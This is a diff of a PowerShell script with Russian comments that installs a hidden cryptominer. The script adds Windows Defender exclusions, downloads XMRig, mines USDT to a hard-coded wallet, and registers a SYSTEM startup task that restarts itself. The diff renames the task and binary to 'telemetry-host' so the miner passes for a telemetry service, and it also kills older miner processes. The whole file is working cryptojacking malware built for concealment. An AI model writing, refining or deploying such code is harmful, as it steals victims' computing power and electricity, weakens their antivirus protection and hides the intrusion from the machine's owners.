@@ -1,30 +1,37 @@
-$ScriptPath = "C:\ProgramData\SysWorker\molino.ps1"
-New-Item -ItemType Directory -Path (Split-Path $ScriptPath) -Force | Out-Null
-
-$ScriptContent = @'
 # === НАСТРОЙКИ ===
 $Coin = "USDT"
 $Wallet = "0xbD4a36e73BDa8B0f50689d60528c698FA05b6005"
 $RefCode = ""                          # Опционально: реф-код unMineable (снижает комиссию с 1% до 0.75%)
 $Pool = "rx.unmineable.com:3333"
-$MaxCpuUsage = 60                      # Процент потоков CPU (можно поменять под сервер)
+$MaxCpuUsage = 60                      # Процент потоков CPU (можно поменять под конкретную машину)
 $InstallDir = "C:\ProgramData\SysWorker"
-$TaskName = "SysBackgroundWorker"
+$TaskName = "telemetry-host"
+$ExeFileName = "telemetry-host.exe"
 # =================
 
 $ErrorActionPreference = "Stop"
 $WorkerName = ($env:COMPUTERNAME -replace '[^a-zA-Z0-9_-]', '')
+$TargetExePath = "$InstallDir\$ExeFileName"
 
 if (-not (Test-Path $InstallDir)) {
     New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
 }
 
-# 1. Исключение в Windows Defender ДО скачивания
+# 1. Исключение в Windows Defender ДО скачивания (и для директории, и для бинарника)
 try {
-    Add-MpPreference -ExclusionPath $InstallDir -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath $InstallDir, $TargetExePath -ErrorAction SilentlyContinue
 } catch {}
 
-# 2. Скачиваем XMRig для Windows x64
+# 2. Останавливаем старую задачу и старые процессы перед обновлением
+try {
+    Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
+    Stop-ScheduledTask -TaskName "SysBackgroundWorker" -ErrorAction SilentlyContinue
+} catch {}
+
+Get-Process -Name "telemetry-host", "xmrig" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+Start-Sleep -Seconds 1
+
+# 3. Скачиваем и распаковываем XMRig для Windows x64
 $XmrigVer = "6.22.2"
 $ZipUrl = "https://github.com/xmrig/xmrig/releases/download/v$XmrigVer/xmrig-$XmrigVer-msvc-win64.zip"
 $ZipPath = "$InstallDir\xmrig.zip"
@@ -34,15 +41,15 @@ $TmpDir = "$InstallDir\tmp"
 Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath
 Expand-Archive -Path $ZipPath -DestinationPath $TmpDir -Force
 
-$ExeFile = Get-ChildItem -Path $TmpDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
-if (-not $ExeFile) {
+$ExtractedExe = Get-ChildItem -Path $TmpDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
+if (-not $ExtractedExe) {
     throw "Не найден xmrig.exe после распаковки архива."
 }
 
-Move-Item -Path $ExeFile.FullName -Destination "$InstallDir\xmrig.exe" -Force
+Move-Item -Path $ExtractedExe.FullName -Destination $TargetExePath -Force
 Remove-Item -Path $TmpDir, $ZipPath -Recurse -Force
 
-# 3. Формируем config.json в UTF-8 СТРОГО БЕЗ BOM
+# 4. Генерируем config.json в UTF-8 СТРОГО БЕЗ BOM
 $UserString = "$Coin`:$Wallet.$WorkerName"
 if ($RefCode -ne "") {
     $UserString = "$UserString#$RefCode"
@@ -73,8 +80,8 @@ $JsonConfig = @"
 $Utf8NoBom = New-Object System.Text.UTF8Encoding($false)
 [System.IO.File]::WriteAllText("$InstallDir\config.json", $JsonConfig, $Utf8NoBom)
 
-# 4. Пересоздаём и запускаем фоновую задачу в Task Scheduler
-$Action = New-ScheduledTaskAction -Execute "$InstallDir\xmrig.exe" -Argument "-c config.json" -WorkingDirectory $InstallDir
+# 5. Регистрируем и запускаем фоновую задачу telemetry-host
+$Action = New-ScheduledTaskAction -Execute $TargetExePath -Argument "-c config.json" -WorkingDirectory $InstallDir
 $Trigger = New-ScheduledTaskTrigger -AtStartup
 $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Days 0) -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1)
@@ -84,12 +91,6 @@ Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Pr
 Start-ScheduledTask -TaskName $TaskName
 Start-Sleep -Seconds 3
 
-Write-Host "Готово. Воркер $WorkerName запущен в фоне." -ForegroundColor Green
-Get-Process xmrig -ErrorAction SilentlyContinue | Select-Object Id, ProcessName, CPU
+Write-Host "Готово. Воркер $WorkerName запущен через задачу $TaskName." -ForegroundColor Green
+Get-Process -Name "telemetry-host" -ErrorAction SilentlyContinue | Select-Object Id, ProcessName, CPU
 Get-ScheduledTask -TaskName $TaskName | Get-ScheduledTaskInfo
-'@
-
-$Utf8NoBom = New-Object System.Text.UTF8Encoding($false)
-[System.IO.File]::WriteAllText($ScriptPath, $ScriptContent, $Utf8NoBom)
-
-& $ScriptPath
